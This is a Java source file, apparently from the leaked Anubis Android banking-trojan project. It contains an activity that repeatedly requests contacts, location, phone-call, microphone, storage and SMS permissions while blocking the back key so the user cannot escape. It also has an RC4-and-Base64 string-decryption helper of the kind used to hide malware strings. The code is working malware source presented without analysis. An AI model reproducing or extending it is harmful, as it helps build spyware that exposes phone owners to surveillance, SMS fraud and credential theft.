package anubis.bot.myapplication.Activity;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.KeyEvent;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.StoreStringClass;
import anubis.bot.myapplication.UtilsClass;


public class ActivityPermissions extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 111;
   StoreStringClass store = new StoreStringClass();
    UtilsClass SF = new UtilsClass();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if(SF.hasPermissions(this))finish();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
            int res;

            res =   checkCallingOrSelfPermission(store.READ_CONTACTS[0]);
            if (!(res == PackageManager.PERMISSION_GRANTED)){
                requestPermissions(store.READ_CONTACTS,PERMISSION_REQUEST_CODE);
            }

            res =   checkCallingOrSelfPermission(store.ACCESS_FINE_LOCATION[0]);
            if (!(res == PackageManager.PERMISSION_GRANTED)){
                requestPermissions(store.ACCESS_FINE_LOCATION,PERMISSION_REQUEST_CODE);
            }

            res =   checkCallingOrSelfPermission(store.CALL_PHONE[0]);
            if (!(res == PackageManager.PERMISSION_GRANTED)){
                requestPermissions(store.CALL_PHONE,PERMISSION_REQUEST_CODE);
            }

            res =   checkCallingOrSelfPermission(store.RECORD_AUDIO[0]);
            if (!(res == PackageManager.PERMISSION_GRANTED)){
                requestPermissions(store.RECORD_AUDIO,PERMISSION_REQUEST_CODE);
            }

            res =   checkCallingOrSelfPermission(store.WRITE_EXTERNAL_STORAGE[0]);
            if (!(res == PackageManager.PERMISSION_GRANTED)){
                requestPermissions(store.WRITE_EXTERNAL_STORAGE,PERMISSION_REQUEST_CODE);
            }

            res =   checkCallingOrSelfPermission(store.SEND_SMS[0]);
            if (!(res == PackageManager.PERMISSION_GRANTED)){
                requestPermissions(store.SEND_SMS,PERMISSION_REQUEST_CODE);
            }
        }

      /*  Можно так! разом все
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
            requestPermissions(store.permissions,PERMISSION_REQUEST_CODE);
        }*/

        finish();
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        return keyCode == KeyEvent.KEYCODE_BACK || super.onKeyDown(keyCode, event);
    }
    @Override
    protected void onResume() {
        super.onResume();
    }
    @Override
    protected void onStop() {
        super.onStop();
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
    @Override
    protected void onPause() {
        super.onPause();
    }
}
